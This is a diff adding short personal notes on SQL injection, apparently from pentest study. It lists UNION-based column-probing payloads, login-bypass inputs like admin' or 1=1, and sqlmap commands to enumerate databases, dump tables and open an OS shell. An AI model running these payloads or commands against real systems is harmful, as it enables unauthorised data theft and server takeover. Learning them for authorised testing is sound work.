@@ -1,0 +1,39 @@
+SQLi Notes
+
+Boolean (union based injection)
+?search=query’ UNION SELECT ‘els1’; — - (error might mean columns wrong)
+?search=query’ UNION SELECT ‘els1’, ‘els2’; — - (another error means increment)
+?search=query’ UNION SELECT ‘els1’, ‘els2’, ‘els3’, ‘els4’; — - (no errors triggered means query contains 4 field, and is therefore vulnerable to UNION based injections
+
+—banner command confirms db version
+
+-v3 shows what payload sqlmap uses, you can test in browser, but replace # with %23
+
+—dbs once you have a command which works, this can be appended to show databases
+—users will show users which can access
+-D <db name> —tables = this shows tables in the database
+-D <db name> -T <table name> —columns
+-D <db name> -T <table name> —C <column name, column name2> —dump
+
+
+__________________________________________________
+Above this line applies to GET, below is more specific to POST
+__________________________________________________
+In repeater:
+user=admin&pass=password  (default)
+user=admin’&pass=password or user=admin’ or 1=1; — -@pass=password     These are to determine whether the parameter is vulnerable
+
+sqlmap -u ‘<website.php>’ —data=‘user=a&pass=a’ -p user —technique=B —banner 
+(This is for a POST request to website with those user and pass, using Boolean techniques on the user parameter to retrieve the database banner) Maybe click N to skip the redirect
+
+Add —dbs, then tables etc. 
+
+Can directly import a request from Burp Proxy while is saved to a file
+sqlmap -r <file.req location> -p user —technique=B —banner
+File may help reveal the request which can then be sent back to Repeater
+
+__________________________________________
+Shell
+_____________________
+
+Sqlmap -r <file.req> -p title —os-shell
